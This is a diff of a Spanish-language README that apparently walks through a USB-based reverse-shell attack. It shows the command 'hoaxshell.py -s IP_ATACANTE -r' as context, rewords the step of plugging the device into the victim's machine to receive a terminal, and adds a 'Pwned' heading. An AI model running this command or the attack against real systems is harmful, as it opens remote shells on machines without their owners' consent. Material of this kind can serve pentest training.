@@ -66,10 +66,11 @@ python3 ./hoaxshell.py -s IP_ATACANTE -r -H 'Authorization'
 <img width="2531" height="1378" alt="imagen" src="https://github.com/user-attachments/assets/6d478ecd-7554-4342-a291-28438e7848d8" />
 
 
-### 6. Conectar el dispositivo a la máquina victima y esperamos la respuesta en nuestra máquina de atacante.
+### 6. Conectar el dispositivo a la máquina victima y esperar la Respuesta. Si todo sale bien recibiremos la terminal.
 
    
 ![image](https://github.com/user-attachments/assets/5c8ce65b-5abe-4dae-a521-7f1f90dc95a5)
 
 
+### 7. Pwned
 
